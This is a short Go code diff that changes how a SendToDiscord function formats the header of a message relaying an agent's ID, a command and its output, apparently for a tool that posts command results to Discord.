@@ -22,7 +22,7 @@ func SendToDiscord(agentId string, command string, output string) {
 		os.Exit(1)
 	}
 
-	header := "[Agent: " + agentId + "]\n$ " + command + "\n```\n"
+	header := "> Agent: " + agentId + "\n> Command: " + command + "\n```\n"
 	footer := "\n```"
 	maxOutput := discordMaxLength - len(header) - len(footer)
 	if len(output) > maxOutput {
